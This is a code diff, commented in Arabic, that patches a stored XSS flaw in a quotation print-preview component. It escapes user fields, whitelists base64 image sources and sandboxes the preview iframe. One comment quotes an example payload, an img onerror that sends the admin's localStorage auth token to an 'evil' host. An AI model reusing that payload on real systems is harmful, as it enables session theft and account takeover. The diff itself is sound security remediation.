@@ -224,6 +224,25 @@ export default function QuotationNew() {
     }
   }
 
+  // esc يهرّب أي نص قبل ما ينحط داخل HTML.
+  //
+  // ثغرة كانت هنا (Stored XSS): اسم الزبون/المشروع/المنتج جانت تنحط بالـHTML
+  // نياً. موظف عنده صلاحية عرض سعر يقدر يخزن مثلاً:
+  //   <img src=x onerror="fetch('https://evil/?t='+localStorage.authToken)">
+  // وأول ما الإداري يفتح المعاينة ينسرق توكن جلسته وينفّذ عمليات بصلاحياته.
+  const esc = (v: unknown): string =>
+    String(v ?? '')
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#39;')
+
+  // escAttr للروابط داخل src: نسمح بس بصور base64 (data:image/...) — أي شي
+  // ثاني (javascript: مثلاً) ينرفض.
+  const safeImg = (v: string | undefined): string =>
+    v && /^data:image\/(png|jpe?g|gif|webp|svg\+xml);base64,[A-Za-z0-9+/=]+$/.test(v) ? v : ''
+
   // buildPrintHtml يبني نفس النسخة الي تنطبع بالضبط — نستعملها للطباعة
   // وللمعاينة سوه، حتى المعاينة تكون طبق الأصل للمطبوع مو شي ثاني.
   const buildPrintHtml = (withImages = true): string | null => {
@@ -238,17 +257,18 @@ export default function QuotationNew() {
     const MAX_ITEMS_CONT = 10
 
     const makeItemRow = (item: typeof validItems[number], idx: number) => {
+      const safeSrc = safeImg(item.imageBase64)
       const imgCell = withImages
-        ? (item.imageBase64
-          ? `<img src="${item.imageBase64}" style="width:55px;height:55px;object-fit:contain;border-radius:6px;border:1px solid #e0e0e0;background:#fafafa;display:block;margin:0 auto;">`
+        ? (safeSrc
+          ? `<img src="${safeSrc}" style="width:55px;height:55px;object-fit:contain;border-radius:6px;border:1px solid #e0e0e0;background:#fafafa;display:block;margin:0 auto;">`
           : `<div style="width:55px;height:55px;background:#f0f2f8;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:26px;margin:0 auto;">📦</div>`)
         : ''
       return `<tr>
         <td class="col-no">${idx + 1}</td>
         ${withImages ? `<td class="col-img">${imgCell}</td>` : ''}
-        <td class="col-item">${item.productName}</td>
-        <td class="col-unit">${item.unit || '-'}</td>
-        <td class="col-qty">${item.quantity}</td>
+        <td class="col-item">${esc(item.productName)}</td>
+        <td class="col-unit">${esc(item.unit || '-')}</td>
+        <td class="col-qty">${esc(item.quantity)}</td>
         <td class="col-price">${fmt(item.unitPrice)}</td>
         <td class="col-total">${fmt(item.totalPrice)}</td>
       </tr>`
@@ -303,7 +323,7 @@ export default function QuotationNew() {
       return pageShell(`
     ${headerHtml}
     <div class="info-row-p2">
-      <div class="info-item"><div class="label">اسم الزبون</div><div class="value">${customerName}</div></div>
+      <div class="info-item"><div class="label">اسم الزبون</div><div class="value">${esc(customerName)}</div></div>
       <div class="info-item"><div class="label">التاريخ:</div><div class="value">${qdate}</div></div>
       <div class="info-item"><div class="label">تكملة المنتجات</div><div class="value">صفحة ${ci + 2}</div></div>
     </div>
@@ -392,10 +412,10 @@ body { background: #fff; margin: 0; padding: 0; -webkit-print-color-adjust: exac
 ${pageShell(`
     ${headerHtml}
     <div class="info-row-p1">
-      <div class="info-item"><div class="label">اسم المشروع والموقع:</div><div class="value">${projectName || '---'}</div></div>
-      <div class="info-item"><div class="label">اسم الزبون:</div><div class="value">${customerName}</div></div>
-      <div class="info-item"><div class="label">رقم الهاتف:</div><div class="value">${customerPhone || '---'}</div></div>
-      <div class="info-item"><div class="label">العنوان/المحافظة:</div><div class="value">${customerAddress || '---'}</div></div>
+      <div class="info-item"><div class="label">اسم المشروع والموقع:</div><div class="value">${esc(projectName || '---')}</div></div>
+      <div class="info-item"><div class="label">اسم الزبون:</div><div class="value">${esc(customerName)}</div></div>
+      <div class="info-item"><div class="label">رقم الهاتف:</div><div class="value">${esc(customerPhone || '---')}</div></div>
+      <div class="info-item"><div class="label">العنوان/المحافظة:</div><div class="value">${esc(customerAddress || '---')}</div></div>
     </div>
     <div class="title-right">عرض السعر الاولي</div>
     <hr class="hr">
@@ -410,8 +430,8 @@ ${contPagesHtml}
 ${pageShell(`
     ${headerHtml}
     <div class="info-row-p2">
-      <div class="info-item"><div class="label">اسم الزبون</div><div class="value">${customerName}</div></div>
-      <div class="info-item"><div class="label">رقم العرض:</div><div class="value">${quotationNumber || '---'}</div></div>
+      <div class="info-item"><div class="label">اسم الزبون</div><div class="value">${esc(customerName)}</div></div>
+      <div class="info-item"><div class="label">رقم العرض:</div><div class="value">${esc(quotationNumber || '---')}</div></div>
       <div class="info-item"><div class="label">التاريخ:</div><div class="value">${qdate}</div></div>
     </div>
     <hr class="hr">
@@ -425,7 +445,7 @@ ${pageShell(`
     <hr class="hr-light">
     <div class="notes-title">ملاحظات خاصة بالعرض:</div>
     <hr class="hr-light" style="margin: 6px 0 8px 0;">
-    <div class="notes-content">${notesText}</div>
+    <div class="notes-content">${esc(notesText)}</div>
     <hr class="hr-light">
     <div class="title-center">شروط واحكام عرض السعر</div>
     <ol class="terms-list">${termsHtml}</ol>
@@ -897,6 +917,10 @@ ${pageShell(`
           </div>
           <iframe
             title="معاينة عرض السعر"
+            // sandbox بدون allow-scripts: المحتوى ثابت وما يحتاج جافاسكربت،
+            // فحتى لو تسرّب وسم خبيث ما ينفّذ، وما يقدر يوصل لـlocalStorage
+            // ولا لكوكيز الصفحة الأم (طبقة دفاع ثانية بعد التهريب).
+            sandbox=""
             srcDoc={previewHtml}
             style={{ flex: 1, width: '100%', border: 'none', borderRadius: '12px', background: 'white' }}
           />
